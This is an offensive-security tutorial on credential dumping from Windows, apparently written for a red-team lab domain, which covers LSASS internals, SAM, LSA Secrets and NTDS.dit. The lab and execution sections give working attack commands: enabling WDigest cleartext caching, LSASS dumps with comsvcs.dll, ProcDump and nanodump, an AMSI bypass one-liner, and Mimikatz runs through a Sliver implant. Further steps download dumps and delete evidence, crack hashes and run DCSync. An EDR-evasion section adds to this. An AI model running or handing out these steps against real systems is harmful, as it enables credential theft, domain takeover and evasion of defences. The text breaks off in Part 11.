# CREDENTIAL DUMPING: THE COMPLETE GUIDE
## Stealing Passwords from Windows Memory

> **This is one of the most powerful post-exploitation techniques.**
>
> Once you have admin access to a Windows machine, you can:
> - Extract password hashes for ANY user who logged in
> - Get CLEARTEXT passwords (in some cases!)
> - Steal Kerberos tickets for Pass-the-Ticket attacks
> - Dump Domain Admin credentials if they logged in!
>
> This guide explains EVERYTHING from the ground up.

---

# TABLE OF CONTENTS

**ABSOLUTE FUNDAMENTALS (START HERE!)**
0. [Understanding Credential Dumping from Zero](#part-0-fundamentals)

**FOUNDATIONAL KNOWLEDGE**
1. [Windows Authentication Architecture](#part-1-auth-architecture)
2. [LSASS Process Internals](#part-2-lsass-internals)
3. [Credential Storage Locations](#part-3-credential-storage)
4. [WDigest and Cleartext Credentials](#part-4-wdigest)

**ADVERSARY TRADECRAFT**
5. [APT Credential Dumping Techniques](#part-5-apt-tradecraft)
6. [EDR Evasion Strategies](#part-6-edr-evasion)
7. [Alternative Dump Methods](#part-7-alternative-methods)

**PRACTICAL EXECUTION**
8. [Lab Setup](#part-8-lab-setup)
9. [Dumping with Defender Bypass](#part-9-attack-execution)
10. [Analyzing Dumped Credentials](#part-10-analysis)

**OPERATIONAL**
11. [Post-Exploitation with Credentials](#part-11-post-exploitation)
12. [Interview Questions (15+)](#part-12-interview)
13. [Troubleshooting](#part-13-troubleshoot)

---

# PART 0: Understanding Credential Dumping from Zero {#part-0-fundamentals}

**Before diving into technical details, let's understand the basics.**

---

## 0.1: What Does "Credential Dumping" Mean?

**Credential dumping = extracting passwords or password-equivalent data from a computer.**

When you log into Windows, your password (or a representation of it) gets stored in memory. Credential dumping means reading that memory to extract those credentials.

```
SIMPLE EXPLANATION:
────────────────────────────────────────────────────────────────

1. User logs into Windows with password "MyPassword123!"

2. Windows needs to remember this password for:
   - Accessing network resources (file shares)
   - Single Sign-On (so you don't type password again)
   - Background authentication tasks
   
3. Windows stores credential data in a process called LSASS

4. ATTACKER gains admin access to the machine

5. Attacker reads LSASS memory

6. Attacker extracts the password (or hash)

7. Attacker can now:
   - Log in as that user elsewhere
   - Access network resources as that user
   - If user is Domain Admin → GAME OVER
```

---

## 0.2: What is LSASS? (The Most Important Thing to Understand)

**LSASS = Local Security Authority Subsystem Service**

This is a Windows process (lsass.exe) that handles ALL authentication on the system.

```
WHERE LSASS LIVES:
────────────────────────────────────────────────────────────────

WINDOWS TASK MANAGER:
┌─────────────────────────────────────────────────────────────┐
│  Name                    │ PID   │ Memory  │                │
├─────────────────────────────────────────────────────────────┤
│  System                  │ 4     │ 0.1 MB  │                │
│  Registry                │ 72    │ 8 MB    │                │
│  smss.exe                │ 364   │ 0.5 MB  │                │
│  csrss.exe               │ 420   │ 3 MB    │                │
│  wininit.exe             │ 504   │ 1 MB    │                │
│  services.exe            │ 560   │ 5 MB    │                │
│  lsass.exe               │ 680   │ 15 MB   │ ← THIS ONE!    │
│  svchost.exe             │ 756   │ 10 MB   │                │
│  ...                     │       │         │                │
└─────────────────────────────────────────────────────────────┘

LSASS is ALWAYS running on Windows. You can find it in Task Manager.
Its process ID (PID) is usually between 500-900.
```

**What does LSASS do?**

| Function | Description |
|----------|-------------|
| **Authentication** | Verifies username/password during logon |
| **Access Token Creation** | Creates security tokens for logged-in users |
| **Password Change** | Handles password changes for local accounts |
| **Credential Caching** | Stores credentials in memory for Single Sign-On |
| **Security Policy** | Enforces security settings |

---

## 0.3: Why Does Windows Store Passwords in Memory?

**Good question! It seems insecure, so why do it?**

**Reason: Single Sign-On (SSO)**

Imagine if Windows DIDN'T cache your credentials:

```
WITHOUT CREDENTIAL CACHING (TERRIBLE USER EXPERIENCE):
────────────────────────────────────────────────────────────────

You log in to your PC:
  Enter password: ********  ✓

You open a file share:
  Enter password for \\fileserver\share: ********  ← AGAIN?!

You connect to your email:
  Enter password for Outlook: ********  ← AGAIN?!

You print a document:
  Enter password for print server: ********  ← REALLY?!

You would enter your password HUNDREDS of times a day!
```

**With credential caching:**

```
WITH CREDENTIAL CACHING (WHAT WINDOWS DOES):
────────────────────────────────────────────────────────────────

You log in to your PC:
  Enter password: ********  ✓
  
  → Windows caches your credentials in LSASS
  
You open a file share:
  → Windows uses cached credentials → AUTOMATIC!

You connect to your email:
  → Windows uses cached credentials → AUTOMATIC!

You print a document:
  → Windows uses cached credentials → AUTOMATIC!

Much better user experience!
But... the credentials are sitting in memory.
```

---

## 0.4: What is a "Hash"? (Password Hashes Explained)

**Windows doesn't store your actual password - it stores a HASH of it.**

```
WHAT IS A HASH?
────────────────────────────────────────────────────────────────

A hash is a ONE-WAY transformation of your password.

PASSWORD: "MyPassword123!"
    │
    │  [Hash Function]
    │  (NTLM algorithm)
    │
    ▼
HASH: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"

PROPERTIES OF HASHES:
1. Same password → always same hash
2. Hash → can't reverse to get password (one-way)
3. Different passwords → different hashes
4. Fixed length (32 characters for NTLM)
```

**Why use hashes instead of passwords?**

| Storage | If Attacker Steals It... |
|---------|-------------------------|
| Raw password | Can immediately use it |
| Password hash | Must CRACK it first (time-consuming) |

**But here's the catch for Windows:**

The hash IS a credential! You don't always need to crack it!
- **Pass-the-Hash**: Use the hash directly for authentication
- **NTLM authentication**: Accepts hash, not password
- **Only Kerberos** truly requires the password

---

## 0.5: What Can We Extract from LSASS?

**Different types of credentials might be in LSASS memory:**

| Credential Type | What It Is | Can We Use It? |
|-----------------|-----------|----------------|
| **NTLM Hash** | Hash of password | Yes! Pass-the-Hash |
| **Kerberos Tickets** | TGT/TGS tickets | Yes! Pass-the-Ticket |
| **Cleartext Password** | Actual password (WDigest) | Yes! Direct use |
| **SHA1 Hash** | Different hash format | Sometimes |
| **DPAPI Keys** | Encryption keys | For decrypting other secrets |

**When is cleartext password available?**

```
CLEARTEXT PASSWORD AVAILABILITY:
────────────────────────────────────────────────────────────────

WDigest Enabled (Legacy Systems):
  Windows 7, Server 2008 R2, and older = CLEARTEXT BY DEFAULT!
  
WDigest Disabled (Modern Systems):
  Windows 8.1+, Server 2012 R2+ = No cleartext by default
  BUT: If attacker enables WDigest, next logon = cleartext stored!

NTLM Hash:
  ALWAYS available for logged-on users
  
Kerberos Tickets:
  Available if user accessed Kerberos services
```

---

## 0.6: The Attack Chain - How Credential Dumping Fits In

```
TYPICAL ATTACK PROGRESSION:
────────────────────────────────────────────────────────────────

[Initial Access] → [Privilege Escalation] → [Credential Dumping] → [Lateral Movement]

1. You get initial access to WS01 (phishing, exploit, etc.)
   You are: vamsi.krishna (regular user)

2. You escalate privileges to LOCAL ADMIN on WS01
   You are: WS01\Administrator

3. YOU DUMP CREDENTIALS from LSASS
   You find: ammulu.orsu (Domain Admin was logged in!)
   You now have: ammulu.orsu's NTLM hash (or cleartext!)

4. You use those credentials to move LATERALLY
   You Pass-the-Hash to DC01
   You are now: Domain Admin!

CREDENTIAL DUMPING IS THE BRIDGE FROM "LOCAL ADMIN" TO "DOMAIN ADMIN"!
```

---

## 0.7: What Tools Do This?

| Tool | What It Does | Notes |
|------|-------------|-------|
| **Mimikatz** | The legendary tool for credential dumping | Most featured, most detected |
| **pypykatz** | Python port of Mimikatz | Runs on Linux, parses dump files |
| **SharpKatz** | C# port of Mimikatz | Better for .NET execution |
| **comsvcs.dll** | Windows built-in, can dump LSASS | Stealthier, no extra tools |
| **ProcDump** | Sysinternals tool | Signed by Microsoft, less suspicious |

---

## 0.8: What Defenses Exist?

**Windows has added protections over the years:**

| Defense | What It Does | Bypass? |
|---------|-------------|---------|
| **WDigest disabled** | No cleartext passwords | Admin can re-enable |
| **Credential Guard** | Runs LSASS in isolated VM | Difficult but possible |
| **Protected LSASS (PPL)** | Prevents unsigned code from reading LSASS | Driver-level bypass |
| **EDR/AV** | Detects Mimikatz and similar tools | Obfuscation, custom tools |

**In our lab, these protections are disabled so you can learn!**

---

## 0.9: Summary Before Diving Deeper

| Concept | What It Is |
|---------|-----------|
| **Credential Dumping** | Extracting passwords/hashes from memory |
| **LSASS** | Windows process that stores all credentials |
| **NTLM Hash** | Password hash, usable for Pass-the-Hash |
| **WDigest** | Old feature that stores cleartext passwords |
| **Mimikatz** | Most famous tool for credential dumping |
| **Why It Works** | Windows caches credentials for Single Sign-On |

**Now let's go into the technical details...**

---

# PART 1: Windows Authentication Architecture {#part-1-auth-architecture}

## 1.1: The Authentication Stack

**When you log into Windows, multiple components work together:**

```
WINDOWS AUTHENTICATION ARCHITECTURE:
────────────────────────────────────────────────────────────────

USER INTERFACE LAYER
┌─────────────────────────────────────────────────────────────┐
│  LogonUI.exe / Credential Providers                         │
│  └── Displays login screen, collects username/password      │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
AUTHENTICATION LAYER
┌─────────────────────────────────────────────────────────────┐
│  WINLOGON.EXE                                                │
│  └── Manages logon sessions                                  │
│  └── Sends credentials to LSASS                              │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
SECURITY LAYER
┌─────────────────────────────────────────────────────────────┐
│  LSASS.EXE (Local Security Authority Subsystem Service)     │
│  ├── Validates credentials                                   │
│  ├── Creates access tokens                                   │
│  ├── Caches credentials for SSO                              │◄── WE TARGET THIS!
│  └── Manages security policy                                 │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
AUTHENTICATION PACKAGES (SSPs)
┌─────────────────────────────────────────────────────────────┐
│  NTLM (msv1_0.dll)       │  Kerberos (kerberos.dll)         │
│  └── NTLM hash auth      │  └── Ticket-based auth           │
├──────────────────────────┼──────────────────────────────────┤
│  WDigest (wdigest.dll)   │  CredSSP (credssp.dll)           │
│  └── Cleartext storage!  │  └── RDP authentication          │
├──────────────────────────┼──────────────────────────────────┤
│  TsPkg (tspkg.dll)       │  LiveSSP (livessp.dll)           │
│  └── Terminal Services   │  └── Microsoft accounts          │
└─────────────────────────────────────────────────────────────┘
```

## 1.2: Why LSASS is the Target

**LSASS (Local Security Authority Subsystem Service) is attacking gold because:**

1. **Single Point of Contact:** All authentication flows through LSASS
2. **Credential Caching:** Stores credentials for Single Sign-On (SSO)
3. **Multiple Formats:** Has NTLM hashes, Kerberos tickets, sometimes cleartext
4. **Domain Credentials:** If a Domain Admin logged in, their creds are cached!

## 1.3: Authentication Packages (SSPs)

**LSASS loads Security Support Providers (SSPs) that handle different auth types:**

| SSP | DLL | Stores | Why It Matters |
|-----|-----|--------|----------------|
| NTLM | msv1_0.dll | NTLM hashes | Pass-the-Hash attacks |
| Kerberos | kerberos.dll | TGTs, TGS tickets | Pass-the-Ticket attacks |
| WDigest | wdigest.dll | CLEARTEXT passwords | Direct credential theft |
| CredSSP | credssp.dll | Delegated creds | RDP credential theft |
| TsPkg | tspkg.dll | Terminal creds | RDP sessions |

---

# PART 2: LSASS Process Internals {#part-2-lsass-internals}

## 2.1: LSASS Memory Layout

**When you run Mimikatz's `sekurlsa::logonpasswords`, it's parsing these structures:**

```
LSASS MEMORY STRUCTURE:
────────────────────────────────────────────────────────────────

LSASS.EXE (Process ID: ~680)
│
├── Loaded DLLs
│   ├── msv1_0.dll    (NTLM provider)
│   ├── kerberos.dll  (Kerberos provider)
│   ├── wdigest.dll   (WDigest provider)
│   └── ...
│
├── Credential Cache (per logon session)
│   │
│   ├── Logon Session 1 (LUID: 0x3e7)
│   │   ├── Username: SYSTEM
│   │   ├── Domain: NT AUTHORITY
│   │   └── Credentials: [encrypted]
│   │
│   ├── Logon Session 2 (LUID: 0x12345)
│   │   ├── Username: vamsi.krishna
│   │   ├── Domain: ORSUBANK
│   │   ├── NTLM Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
│   │   ├── WDigest Password: "Password123!" (if enabled)
│   │   └── Kerberos Tickets: [TGT, TGS for services]
│   │
│   └── Logon Session 3 (LUID: 0x67890)
│       ├── Username: ammulu.orsu (Domain Admin!)
│       ├── Domain: ORSUBANK
│       ├── NTLM Hash: [DA_HASH]
│       └── Kerberos Tickets: [TGT with DA privileges!]
│
└── Security Policy Data
    └── LSA Secrets, etc.
```

## 2.2: Logon Sessions and LUIDs

**Every authenticated user has a Logon Session identified by a LUID (Locally Unique Identifier):**

```
LOGON SESSIONS:
────────────────────────────────────────────────────────────────

When a user logs in:
1. LSASS creates a new Logon Session
2. Assigns a LUID (e.g., 0x12345678)
3. Validates credentials
4. Creates Access Token
5. Caches credentials for SSO

Multiple sessions can exist:
• Interactive logon (physical keyboard)
• Network logon (SMB share access)
• Service logon (running as service)
• RemoteInteractive (RDP)
```

**Why this matters:**
- Each logon session may have different cached credentials
- Interactive logons cache the most (NTLM, Kerberos, WDigest)
- Network logons may only cache NTLM

## 2.3: Credential Encryption in LSASS

**Credentials aren't stored in raw plaintext (mostly):**

```
LSASS CREDENTIAL ENCRYPTION:
────────────────────────────────────────────────────────────────

ENCRYPTION LAYERS:
┌─────────────────────────────────────────────────────────────┐
│  1. LSA Encryption Key                                       │
│     └── Generated per boot from machine secret               │
│     └── Stored in LSASS memory                               │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  2. Credential Encryption                                    │
│     └── 3DES or AES (depending on Windows version)           │
│     └── Key derived from LSA key + session-specific data     │
└─────────────────────────────────────────────────────────────┘

MIMIKATZ APPROACH:
1. Find LSA encryption key in LSASS memory
2. Locate credential structures
3. Decrypt using the key
4. Display plaintext/hashes
```

---

# PART 3: Credential Storage Locations {#part-3-credential-storage}

## 3.1: The Five Credential Vaults

| Location | What It Stores | Format | Use Case |
|----------|---------------|--------|----------|
| **SAM** | Local user hashes | NTLM | Pass-the-Hash (local) |
| **LSASS** | Logged-on user creds | NTLM, Kerberos, Cleartext | Credential theft |
| **LSA Secrets** | Service account creds | Reversible encryption | Service accounts |
| **NTDS.dit** | All domain hashes | NTLM | Domain persistence |
| **Credential Manager** | Saved passwords | DPAPI encrypted | Cached credentials |

## 3.2: SAM Database Deep Dive

**The Security Accounts Manager (SAM) database:**

```
SAM DATABASE:
────────────────────────────────────────────────────────────────

LOCATION: C:\Windows\System32\config\SAM
          HKLM\SAM (Registry hive)

PROTECTED BY:
• System lock (can't open while Windows running)
• SYSKEY encryption (boot key derived from SYSTEM hive)

CONTAINS:
• Local user accounts only (not domain users)
• NTLM hashes (not cleartext)
• Account metadata (RID, flags, etc.)

EXAMPLE STRUCTURE:
SAM
└── Domains
    └── Account
        └── Users
            ├── 000001F4 (RID 500 = Administrator)
            │   └── V = [encrypted NTLM hash]
            ├── 000001F5 (RID 501 = Guest)
            │   └── V = [encrypted NTLM hash]
            └── 000003E8 (RID 1000 = custom_admin)
                └── V = [encrypted NTLM hash]
```

**Dumping SAM requires:**
1. SYSTEM-level privileges (to access registry)
2. SYSTEM hive (to decrypt SYSKEY)
3. SAM hive (contains hashes)

## 3.3: LSA Secrets

**LSA Secrets store sensitive data that services need:**

```
LSA SECRETS:
────────────────────────────────────────────────────────────────

LOCATION: HKLM\SECURITY\Policy\Secrets

COMMON SECRETS:
• DefaultPassword    - AutoLogon password (CLEARTEXT!)
• $MACHINE.ACC       - Computer account password
• DPAPI_SYSTEM       - DPAPI master key
• _SC_<servicename>  - Service account passwords
• NL$KM              - Cached domain credentials key

PROTECTION:
• LSA encryption (SYSKEY + LSA key)
• Only accessible by SYSTEM

WHY VALUABLE:
• Service accounts often have elevated privileges
• AutoLogon passwords are common misconfigurations
• Computer account can be used for Silver Tickets
```

## 3.4: NTDS.dit (Domain Controller Only)

**The "Holy Grail" - contains ALL domain user hashes:**

```
NTDS.DIT:
────────────────────────────────────────────────────────────────

LOCATION: C:\Windows\NTDS\ntds.dit (on Domain Controllers)

CONTAINS:
• Every domain user's NTLM hash
• All computer account hashes
• Schema, naming contexts
• Basically the entire AD database

PROTECTED BY:
• ESE database format
• PEK (Password Encryption Key) encryption
• File lock (can't open while AD running)

DUMPING METHODS:
• Volume Shadow Copy (vssadmin)
• DCSync (replication abuse, requires specific privileges)
• ntdsutil (offline)
• secretsdump.py
```

---

# PART 4: WDigest and Cleartext Credentials {#part-4-wdigest}

## 4.1: What is WDigest?

**WDigest is an authentication protocol for HTTP Digest Authentication:**

```
WDIGEST HISTORY:
────────────────────────────────────────────────────────────────

WHY IT EXISTS:
• HTTP Digest Auth requires server to have reversible password
• WDigest SSP caches credentials in reversible form
• Used for legacy web applications, IIS integration

THE PROBLEM:
• "Reversible" effectively means CLEARTEXT in memory
• Any LSASS dump reveals plaintext passwords
• Was enabled by default until Windows 8.1/2012 R2

TIMELINE:
• Pre-Windows 8.1: WDigest enabled by default = CLEARTEXT
• Windows 8.1+: WDigest disabled by default
• KB2871997: Backported fix to older systems
```

## 4.2: The UseLogonCredential Registry Key

**WDigest behavior is controlled by a registry setting:**

```
REGISTRY KEY:
────────────────────────────────────────────────────────────────

LOCATION:
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest

VALUE:
UseLogonCredential (DWORD)
  - 0 = Disabled (no cleartext storage)
  - 1 = Enabled (CLEARTEXT in memory!)

DEFAULT:
  - Windows 7/2008 R2: 1 (enabled)
  - Windows 8.1/2012 R2+: 0 (disabled)

ENABLING (as attacker with admin access):
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

NOTE: User must RE-LOGON for cleartext to appear!
```

## 4.3: Forcing Credential Storage

**APT technique: Enable WDigest, wait for logon, dump:**

```
ATTACK FLOW:
────────────────────────────────────────────────────────────────

1. Gain admin access to target machine

2. Enable WDigest:
   reg add HKLM\...\WDigest /v UseLogonCredential /t REG_DWORD /d 1

3. Wait for target user to log in:
   • Interactive logon
   • RDP session
   • Unlock workstation

4. Dump LSASS:
   • Cleartext password now available!

5. Disable WDigest (cleanup):
   reg delete HKLM\...\WDigest /v UseLogonCredential

DETECTION:
• Registry modification detection
• But the key can be added via many legitimate tools
```

---

# PART 5: APT Credential Dumping Techniques {#part-5-apt-tradecraft}

## 5.1: Nation-State Techniques

**APT29 (Cozy Bear) approach:**
- Use custom memory-only tools (no disk artifacts)
- Inject into LSASS directly instead of opening handle
- Extract only specific credentials (targeted)

**APT28 (Fancy Bear) approach:**
- Modified/obfuscated Mimikatz variants
- Dump to encrypted files
- Use scheduled tasks for persistence dumping

**FIN7 approach:**
- PowerShell-based dumping
- Reflective DLL injection
- Exfiltrate via normal C2 channels

## 5.2: Targeted vs. Bulk Dumping

| Approach | Script Kiddie | APT Operator |
|----------|---------------|--------------|
| Method | Run Mimikatz, dump everything | Target specific user's session |
| Timing | Immediately | Wait for high-value logon |
| Output | Save to obvious file | Encrypt and return via C2 |
| Cleanup | None | Remove evidence |

## 5.3: LSASS Dump Alternatives

**Beyond Mimikatz - methods that EDR might miss:**

```
ALTERNATIVE DUMP METHODS:
────────────────────────────────────────────────────────────────

1. COMSVCS.DLL (Built-in Windows)
   rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

2. PROCDUMP (Sysinternals - signed)
   procdump.exe -ma lsass.exe lsass.dmp

3. TASK MANAGER (GUI - no detection!)
   Task Manager → lsass.exe → Create dump file

4. SILENTPROCESSEXIT (Registry-based)
   Configure Windows Error Reporting to dump LSASS

5. SSPI HANDLE DUPLICATION
   Clone LSASS handle from another process

6. DIRECT SYSCALLS
   Bypass ntdll.dll hooks by calling syscalls directly
```

---

# PART 6: EDR Evasion Strategies {#part-6-edr-evasion}

## 6.1: How EDRs Detect LSASS Access

**EDRs watch for:**

```
EDR DETECTION METHODS:
────────────────────────────────────────────────────────────────

1. PROCESS HANDLE ACCESS
   • OpenProcess() call targeting LSASS
   • ACCESS_MASK with PROCESS_VM_READ
   • Non-standard processes opening LSASS

2. NTDLL.DLL HOOKS
   • Hooks on NtReadVirtualMemory
   • Hooks on NtOpenProcess
   • Userland callbacks

3. MINIFILTER DRIVERS
   • Watch for lsass.dmp file writes
   • Monitor temp directories

4. ETW PROVIDERS
   • Microsoft-Windows-Kernel-Process
   • Microsoft-Windows-Security-Auditing

5. SIGNATURE DETECTION
   • Mimikatz binary signatures
   • Known command strings in memory
```

## 6.2: Evasion Techniques

**Bypassing detection:**

```
EVASION STRATEGIES:
────────────────────────────────────────────────────────────────

1. DIRECT SYSCALLS
   • Skip ntdll.dll hooks entirely
   • Call system calls directly via assembly
   • Tools: SysWhispers, HellsGate

2. SACRIFICIAL PROCESSES
   • Spawn legitimate process (notepad.exe)
   • Duplicate handle from that process
   • Read LSASS from "trusted" context

3. MEMORY-ONLY EXECUTION
   • Never touch disk
   • Execute-assembly via C2
   • Reflective loading

4. PROCESS HOLLOWING
   • Hollow out legitimate process
   • Load dumping code there
   • Parent PID spoofing

5. CREDENTIAL GUARD BYPASS
   • If Credential Guard enabled, credentials in VSM
   • Some bypass through DPAPI or cached tickets
```

## 6.3: Sliver's Approach

**Sliver's execute-assembly pipeline:**

```
SLIVER EXECUTE-ASSEMBLY:
────────────────────────────────────────────────────────────────

1. Server prepares .NET assembly (Mimikatz)

2. Implant receives encrypted assembly

3. Implant creates sacrificial process:
   • Spawns notepad.exe (or configured process)
   • Injects .NET CLR into process
   • Loads assembly in memory

4. Assembly executes:
   • Mimikatz runs in sacrificial process
   • Output captured and returned

5. Cleanup:
   • Sacrificial process terminated
   • No disk artifacts

DETECTION:
• Still opens handle to LSASS
• Still triggers ETW events
• But no file on disk
```

---

# PART 7: Alternative Dump Methods {#part-7-alternative-methods}

## 7.1: comsvcs.dll MiniDump

**Using Windows' built-in DLL:**

```powershell
# Get LSASS PID
$lsass = Get-Process lsass
$pid = $lsass.Id

# Dump using comsvcs.dll
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\temp\lsass.dmp full
```

**Why this works:**
- comsvcs.dll is a legitimate Windows DLL
- Signed by Microsoft
- Used for COM+ diagnostics
- Has MiniDump export function

## 7.2: ProcDump (Sysinternals)

**Signed by Microsoft = trusted by many EDRs:**

```bash
# Download from Sysinternals
procdump.exe -ma lsass.exe C:\temp\lsass.dmp -accepteula
```

## 7.3: Task Manager

**Completely fileless dump trigger:**

1. Open Task Manager
2. Details tab → Find lsass.exe
3. Right-click → "Create dump file"
4. Dump saved to `%TEMP%\lsass.DMP`

**No command line to log, no unusual process!**

## 7.4: Nanodump

**Custom tool for stealthy LSASS dumping:**

```bash
# Obfuscated dump using direct syscalls
nanodump.exe -w lsass.dmp

# Output in MiniDump format (parseable by Mimikatz)
```

## 7.5: Extracting from Dump Files

**Once you have lsass.dmp, analyze offline:**

```bash
# On Kali using pypykatz (Python Mimikatz)
pypykatz lsa minidump lsass.dmp

# Or traditional Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

---

# PART 8: Lab Setup {#part-8-lab-setup}

## 8.1: Running the Setup Script

**On DC01 and WS01:**

```powershell
# On DC01
cd C:\AD-RTO\lab-config\server
.\Enable-CredentialExposure.ps1

# On WS01 (via admin RDP or PSRemote)
cd C:\AD-RTO\lab-config\workstation
.\Enable-LocalPrivEscVulnerabilities.ps1
```

## 8.2: What Gets Configured

| Setting | Value | Purpose |
|---------|-------|---------|
| WDigest UseLogonCredential | 1 | Enable cleartext storage |
| LSA RunAsPPL | 0 | Disable Protected LSASS |
| Credential Guard | Disabled | Allow memory access |

## 8.3: Verifying Configuration

```powershell
# Check WDigest
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential

# Check LSA Protection
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue
```

## 8.4: Create Test Logon Sessions

**Log in with different users to populate LSASS:**

1. RDP to WS01 as `vamsi.krishna` (regular user)
2. RDP to WS01 as `ammulu.orsu` (Domain Admin in another session)
3. Now LSASS contains both sets of credentials!

---

# PART 9: Dumping with Defender Bypass {#part-9-attack-execution}

## 9.1: AMSI Bypass First (Critical!)

**Before running ANY .NET tool:**

```bash
sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*siUtils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
```

## 9.2: Elevate to SYSTEM

**Many dump techniques require SYSTEM:**

```bash
sliver (ORSUBANK_WS01) > getsystem

[*] Got SYSTEM!
```

## 9.3: Dump SAM Database (Local Hashes)

```bash
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

**Output:**
```
mimikatz # lsadump::sam
Domain : WS01
SysKey : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

RIDUser : 000001f4 (500)
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
       └── This is the local Administrator hash!

RIDUser : 000001f5 (501) 
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
       └── Empty password hash (guest/disabled)
```

**Usage:** Pass-the-Hash to other machines with same local admin password

## 9.4: Dump LSASS Memory (Domain Credentials!)

```bash
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Output (with WDigest enabled!):**
```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : vamsi.krishna
Domain            : ORSUBANK
Logon Server      : DC01
Logon Time        : 12/27/2024 10:30:00 AM
SID               : S-1-5-21-...-1104
        msv :
         [00000003] Primary
         * Username : vamsi.krishna
         * Domain   : ORSUBANK
         * NTLM     : 4a1e2b3c4d5e6f7a8b9c0d1e2f3a4b5c
         * SHA1     : 1234567890abcdef1234567890abcdef12345678
        wdigest :
         * Username : vamsi.krishna
         * Domain   : ORSUBANK
         * Password : Password123!         ← CLEARTEXT!

Authentication Id : 0 ; 789012 (00000000:000c0a14)
Session           : RemoteInteractive from 2
User Name         : ammulu.orsu
Domain            : ORSUBANK
Logon Server      : DC01
        msv :
         * Username : ammulu.orsu
         * Domain   : ORSUBANK
         * NTLM     : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
        wdigest :
         * Username : ammulu.orsu
         * Domain   : ORSUBANK
         * Password : AdminPass2024!       ← DOMAIN ADMIN CLEARTEXT!
```

**YOU GOT DOMAIN ADMIN CREDENTIALS!**

## 9.5: Dump Kerberos Tickets

```bash
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

**Exports TGTs as .kirbi files for Pass-the-Ticket**

## 9.6: Dump LSA Secrets

```bash
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"
```

**Output:**
```
Secret  : DefaultPassword
cur/text: AutoLogonPassword123!

Secret  : $MACHINE.ACC
cur/hex : 01 02 03 04 ...
        └── Computer account password (for Silver Tickets!)
```

## 9.7: Alternative - comsvcs.dll Dump

**If Mimikatz is detected:**

```bash
# Get LSASS PID
sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "(Get-Process lsass).Id"
# Returns: 680

# Dump with comsvcs.dll
sliver (ORSUBANK_WS01) > execute -o rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 680 C:\temp\lsass.dmp full

# Download the dump
sliver (ORSUBANK_WS01) > download C:\temp\lsass.dmp

# Delete evidence
sliver (ORSUBANK_WS01) > rm C:\temp\lsass.dmp
```

**Analyze dump on Kali:**
```bash
pypykatz lsa minidump lsass.dmp
```

---

# PART 10: Analyzing Dumped Credentials {#part-10-analysis}

## 10.1: Credential Types and Uses

| Credential Type | Format | Primary Use |
|----------------|--------|-------------|
| NTLM Hash | 32-char hex | Pass-the-Hash, cracking |
| Cleartext | Password string | Direct login, spraying |
| Kerberos TGT | .kirbi file | Pass-the-Ticket |
| AES Keys | 64-char hex | Overpass-the-Hash |

## 10.2: Important Users to Look For

```
HIGH-VALUE TARGETS:
────────────────────────────────────────────────────────────────

1. DOMAIN ADMINS
   └── Full domain compromise
   └── Can DCSync, create users, etc.

2. ENTERPRISE ADMINS
   └── Forest-level access
   └── Multi-domain control

3. SERVICE ACCOUNTS
   └── Often over-privileged
   └── May have passwords in LSA Secrets

4. LOCAL ADMINISTRATOR
   └── Lateral movement
   └── Often same password across machines

5. COMPUTER ACCOUNTS
   └── Silver Ticket creation
   └── SPN impersonation
```

## 10.3: Cracking NTLM Hashes

**If no cleartext, crack the hash:**

```bash
# Copy NTLM hash to file
echo "4a1e2b3c4d5e6f7a8b9c0d1e2f3a4b5c" > hash.txt

# Crack with hashcat (NTLM mode = 1000)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

**Speed:** ~35 billion hashes/sec on RTX 3090 (NTLM is FAST!)

## 10.4: Identifying Privileged Accounts

**Cross-reference with BloodHound:**

```cypher
// Find if dumped user is privileged
MATCH (u:User {name: "AMMULU.ORSU@ORSUBANK.LOCAL"})-[r]->(g:Group)
WHERE g.name CONTAINS "ADMIN"
RETURN u.name, g.name
```

---

# PART 11: Post-Exploitation with Credentials {#part-11-post-exploitation}

## 11.1: Got Domain Admin Cleartext?

```bash
# PSRemote to DC
crackmapexec winrm DC01.orsubank.local -u ammulu.orsu -p 'AdminPass2024!' -d orsubank.local

# DCSync to get ALL hashes
secretsdump.py orsubank.local/ammulu.orsu:'AdminPass2024!'@DC01.orsubank.local

# Output includes:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe388c00c7e6b5f9b:::
```

